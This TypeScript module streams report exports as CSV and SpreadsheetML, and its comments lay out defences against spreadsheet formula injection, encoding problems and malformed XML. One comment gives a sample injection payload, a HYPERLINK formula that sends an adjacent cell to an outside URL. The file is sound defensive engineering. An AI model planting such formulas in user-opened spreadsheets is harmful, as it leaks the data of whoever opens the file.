import { csvCell } from '../../../core/persistence/csv';
import {
  ExportFormat,
  ReportColumnType,
  type ExportFormatKey,
  type ReportColumn,
} from './report-catalogue';

/**
 * What a report looks like as bytes, in three formats, as pure functions.
 *
 * Everything here is a `string` in and a `string` out, so the properties that matter — a formula is
 * neutralised, a document number stays text, Arabic survives — are unit tests rather than
 * assertions about a bucket. The service beside it turns them into a stream: header, then a chunk
 * per page, then a footer. **Nothing here holds a report.**
 *
 * ---
 *
 * ## CSV, and the four traps in "CSV is trivial"
 *
 * **1. Formula injection.** A cell beginning `=`, `+`, `-`, `@`, a tab or a carriage return is
 * executed by Excel, LibreOffice and Google Sheets when the file is opened. In this product a cell
 * is a document title, a delete reason or an audit payload — all of them written by a user, some of
 * them by a user who is no longer employed, and the file is opened by a compliance officer on a
 * machine with access to everything. `=HYPERLINK("http://…"&A1,"Click")` in a document title is a
 * working exfiltration of the row beside it.
 *
 * Quoting does **not** fix this, and that is the trap: a CSV reader strips the quotes before the
 * spreadsheet parses the cell, so `"=1+1"` is a formula. The fix is to change the value — a leading
 * apostrophe, which every spreadsheet reads as "the rest of this is text" and shows as neither an
 * apostrophe nor a formula.
 *
 * Worth recording plainly, because it was a live finding rather than a hypothetical: **Phase 9's
 * `evidenceCsvRow` quoted every field uniformly and did not neutralise**, and its comment stated
 * that uniform quoting is what prevents the injection. It does not. Phase 15 did not change it —
 * an evidence bundle's bytes are what a signed manifest's digest attests, and rewriting the writer
 * silently changes what a re-export of the same range produces — and named it as owed, with the
 * phase that owns the fix. **Phase 18 closed it**, by making the rule a *named profile* the
 * manifest states rather than a silent change of behaviour: the cell rule below is now shared,
 * new bundles are written neutralised, and a bundle produced before the change can still be
 * reproduced byte-for-byte because its manifest says which profile wrote it.
 *
 * **2. Excel needs a BOM to read UTF-8.** Without `EF BB BF` a double-clicked CSV is decoded in the
 * system codepage, and every Arabic title in this product becomes mojibake. It costs three bytes.
 *
 * **3. `\r\n`, not `\n`.** RFC 4180 says so, and Excel on Windows is the reader that cares.
 *
 * **4. A quoted field must double its own quotes.** The ordinary rule, and the only one of the four
 * that a naive implementation usually gets right.
 */

const BOM = '\ufeff';
const CRLF = '\r\n';

/**
 * One cell, safe to open.
 *
 * Moved to `core/persistence/csv.ts` by Phase 18 and re-exported here, so every call site in this
 * module and its unit tests are unchanged. It moved because the *evidence* CSV needed the same
 * rule, and the module boundary lint forbids `audit/domain/` reaching into this file — correctly.
 * That file records the rest of the reasoning; the `StreamDigest` precedent is the same one.
 *
 * The apostrophe is prepended *before* quoting, so it is inside the field and travels with the
 * value — a spreadsheet consumes it as the text marker, and a program reading the CSV as data sees
 * one extra character in a cell that would otherwise have been executed. That is the trade, and it
 * is the right way round for a file whose primary reader is Excel.
 */
export { csvCell };

export function csvHeader(columns: readonly ReportColumn[]): string {
  // The BOM leads the file, not the first cell: it is a byte-order mark for the document.
  return `${BOM}${columns.map((column) => csvCell(column.key)).join(',')}${CRLF}`;
}

export function csvRow(columns: readonly ReportColumn[], row: ReportRow): string {
  return `${columns.map((column) => csvCell(cellText(row[column.key]))).join(',')}${CRLF}`;
}

/**
 * ---
 *
 * ## SpreadsheetML 2003 — what this product means by "Excel"
 *
 * Microsoft's XML workbook format: a single XML document, no ZIP container, opened natively by
 * Excel since 2003 and still today. `report-catalogue.ts` records why it was chosen over a
 * hand-built XLSX, and the deciding reason is visible here — the header, a `<Row>` per row and the
 * footer are three independent strings, so a report of any size streams past in constant memory.
 * A ZIP central directory has to state each entry's compressed size and CRC, which means buffering
 * the sheet or emitting data descriptors, and buffering is the one thing this lane exists to avoid.
 *
 * **Cells are typed**, which is the whole reason this is better than a CSV with a different name.
 * `ss:Type="Number"` for a count, `ss:Type="DateTime"` for an instant, and `String` for everything
 * else — so a document number like `0012-2026` is text rather than a subtraction, and a date sorts
 * as a date. A number that is not finite is written as text rather than as `NaN`, because Excel
 * refuses to open a workbook containing a malformed numeric cell and the whole export would be
 * lost for one bad row.
 *
 * The header row is frozen and bold. That is not decoration: a compliance report is scrolled, and a
 * hundred rows past the top an untitled column is unreadable.
 */
export function spreadsheetHeader(sheetName: string, columns: readonly ReportColumn[]): string {
  return (
    `<?xml version="1.0" encoding="UTF-8"?>\n` +
    `<?mso-application progid="Excel.Sheet"?>\n` +
    `<Workbook xmlns="urn:schemas-microsoft-com:office:spreadsheet"` +
    ` xmlns:ss="urn:schemas-microsoft-com:office:spreadsheet"` +
    ` xmlns:x="urn:schemas-microsoft-com:office:excel">\n` +
    `<Styles>` +
    `<Style ss:ID="head"><Font ss:Bold="1"/>` +
    `<Interior ss:Color="#EEEEEE" ss:Pattern="Solid"/></Style>` +
    `<Style ss:ID="date"><NumberFormat ss:Format="yyyy\\-mm\\-dd hh:mm"/></Style>` +
    `</Styles>\n` +
    `<Worksheet ss:Name="${xmlAttribute(sheetName)}">\n` +
    // A frozen, bold header row: a report is scrolled, and a column with no visible name is a
    // column somebody guesses at.
    `<Table>\n<Row ss:StyleID="head">` +
    columns
      .map((column) => `<Cell><Data ss:Type="String">${xmlText(column.key)}</Data></Cell>`)
      .join('') +
    `</Row>\n`
  );
}

export function spreadsheetRow(columns: readonly ReportColumn[], row: ReportRow): string {
  const cells = columns.map((column) => {
    const value = row[column.key];
    if (value === null || value === undefined) {
      // An empty cell rather than an empty string: a blank in a spreadsheet is a blank, and
      // `COUNTA` should not count a column somebody left unset.
      return '<Cell/>';
    }
    if (column.type === ReportColumnType.NUMBER) {
      const numeric = Number(value);
      return Number.isFinite(numeric)
        ? `<Cell><Data ss:Type="Number">${numeric}</Data></Cell>`
        : `<Cell><Data ss:Type="String">${xmlText(cellText(value))}</Data></Cell>`;
    }
    if (column.type === ReportColumnType.DATE) {
      const instant = value instanceof Date ? value : new Date(cellText(value));
      return Number.isNaN(instant.getTime())
        ? '<Cell/>'
        : // No trailing `Z`: SpreadsheetML's `DateTime` has no zone, and appending one makes Excel
          // reject the cell. The value is UTC, which is what every instant in this product is, and
          // the report's own header says so.
          `<Cell ss:StyleID="date"><Data ss:Type="DateTime">${instant
            .toISOString()
            .replace(/\.\d+Z$/, '')}</Data></Cell>`;
    }
    return `<Cell><Data ss:Type="String">${xmlText(cellText(value))}</Data></Cell>`;
  });
  return `<Row>${cells.join('')}</Row>\n`;
}

export function spreadsheetFooter(): string {
  return '</Table>\n</Worksheet>\n</Workbook>\n';
}

/**
 * XML text, with the one rule people forget.
 *
 * XML 1.0 has no representation for most control characters — not even as a numeric reference —
 * so a value carrying one cannot be escaped, only removed. Audit payloads and delete reasons are
 * user text, and one stray `NUL` from a paste would produce a workbook Excel refuses to open at
 * all, which is a worse failure than a missing character.
 */
function xmlText(value: string): string {
  return (
    value
      // eslint-disable-next-line no-control-regex -- exactly the characters XML 1.0 cannot represent
      .replaceAll(/[\u0000-\u0008\u000b\u000c\u000e-\u001f]/gu, '')
      .replaceAll('&', '&amp;')
      .replaceAll('<', '&lt;')
      .replaceAll('>', '&gt;')
  );
}

function xmlAttribute(value: string): string {
  return xmlText(value).replaceAll('"', '&quot;');
}

/**
 * ---
 *
 * ## PDF
 *
 * `pdf-lib` is already an `apps/api` dependency — Preview burns watermarks with it — so the PDF is
 * the one format with a library behind it. It is built in `report-pdf.ts` rather than here because
 * it is the one format that is **not** a string transformation: a PDF is a document object model
 * that has to be assembled and serialised in one piece, which is also why the row cap matters most
 * to it.
 */

/** One row of a report, in the vocabulary every source port answers in. */
export type ReportRow = Readonly<Record<string, unknown>>;

/** What a value looks like in a text cell — one definition, so three formats cannot disagree. */
export function cellText(value: unknown): string {
  if (value === null || value === undefined) {
    return '';
  }
  if (value instanceof Date) {
    return value.toISOString();
  }
  if (typeof value === 'string') {
    return value;
  }
  if (typeof value === 'number' || typeof value === 'boolean' || typeof value === 'bigint') {
    return String(value);
  }
  // Anything else is serialised rather than stringified. A source that ever returned an object in a
  // cell would otherwise export `[object Object]` — visibly wrong in a spreadsheet, and invisibly
  // wrong in a CSV somebody reconciles against.
  return JSON.stringify(value) ?? '';
}

export function writerFor(format: ExportFormatKey): {
  readonly header: (sheetName: string, columns: readonly ReportColumn[]) => string;
  readonly row: (columns: readonly ReportColumn[], row: ReportRow) => string;
  readonly footer: () => string;
} {
  switch (format) {
    case ExportFormat.CSV:
      return {
        header: (_sheet, columns) => csvHeader(columns),
        row: csvRow,
        footer: () => '',
      };
    case ExportFormat.SPREADSHEET_XML:
      return { header: spreadsheetHeader, row: spreadsheetRow, footer: spreadsheetFooter };
    case ExportFormat.PDF:
      // Refused loudly rather than answered with an empty string. A PDF is assembled by
      // `report-pdf.ts` in one piece; reaching here would mean the service had routed a PDF into
      // the streaming path, and a silent fallback would produce a `.pdf` containing CSV.
      throw new Error('A PDF is assembled rather than streamed; use renderReportPdf.');
  }
}
